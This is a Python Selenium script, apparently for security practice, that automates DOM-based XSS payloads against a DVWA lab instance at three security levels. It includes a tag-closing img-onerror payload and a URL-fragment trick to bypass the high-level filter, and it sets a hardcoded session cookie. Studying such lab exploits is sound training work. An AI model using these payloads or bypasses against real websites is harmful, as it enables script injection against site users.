from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

BASE = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/"
XSS_D_URL = BASE + "vulnerabilities/xss_d/"

def init_driver():
    options = webdriver.ChromeOptions()
    # options.add_argument("--headless=new") # 取消注释无头模式，不弹出浏览器窗口
    options.add_argument("--disable-gpu")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    return driver

def dvwa_login(driver, php_sessid):
    """直接设置cookie登录DVWA，不用走表单"""
    driver.get(BASE)
    driver.add_cookie({"name":"PHPSESSID", "value": php_sessid})
    driver.add_cookie({"name":"security", "value":"low"}) # 修改 low / medium / high
    return driver

def test_low(driver):
    print("\n===== Test LOW DOM‑XSS =====")
    # payload1 script标签
    payload = "<script>alert('DOMXSS_Low')</script>"
    url = f"{XSS_D_URL}?default={payload}"
    print(f"访问URL: {url}")
    driver.get(url)
    try:
        alert = WebDriverWait(driver,3).until(EC.alert_is_present())
        print("[+] LOW: 弹窗触发成功！")
        alert.accept()
    except Exception:
        print("[-] LOW: 未弹出alert，换闭合标签payload")
        payload2 = "</option></select><img src=x onerror=alert('low_img')>"
        url2 = f"{XSS_D_URL}?default={payload2}"
        driver.get(url2)
        try:
            alert = WebDriverWait(driver,3).until(EC.alert_is_present())
            print("[+] LOW(闭合标签):弹窗触发成功")
            alert.accept()
        except:
            print("[-] LOW payload全部失效")


def test_medium(driver):
    print("\n===== Test MEDIUM DOM‑XSS =====")
    # medium黑名单过滤<script，使用img onerror，闭合select
    payload = "</option></select><img src=x onerror=alert('DOMXSS_Medium')>"
    url = f"{XSS_D_URL}?default={payload}"
    print(f"访问URL: {url}")
    driver.get(url)
    try:
        alert = WebDriverWait(driver,3).until(EC.alert_is_present())
        print("[+] MEDIUM:弹窗触发成功！")
        alert.accept()
    except Exception:
        print("[-] MEDIUM 未触发弹窗")


def test_high(driver):
    print("\n===== Test HIGH DOM‑XSS (#锚点绕过) =====")
    # #后面内容不会发给后端PHP，JS读取location.href拿到payload
    payload = "</option></select><img src=x onerror=alert('DOMXSS_High')>"
    url = f"{XSS_D_URL}?default=English#{payload}"
    print(f"访问URL: {url}")
    driver.get(url)
    try:
        alert = WebDriverWait(driver,4).until(EC.alert_is_present())
        print("[+] HIGH(#锚点绕过):弹窗触发成功！")
        alert.accept()
    except Exception:
        print("[-] HIGH未触发弹窗")


if __name__ == "__main__":
    # =========修改你的PHPSESSID========
    PHPSESSID = "ldi9n0nspgemlhdv38su5o9dt3"
    # =================================
    drv = init_driver()
    dvwa_login(drv, PHPSESSID)

    test_low(drv)
    # test_medium(drv)
    # test_high(drv)

    time.sleep(2)
    drv.quit()
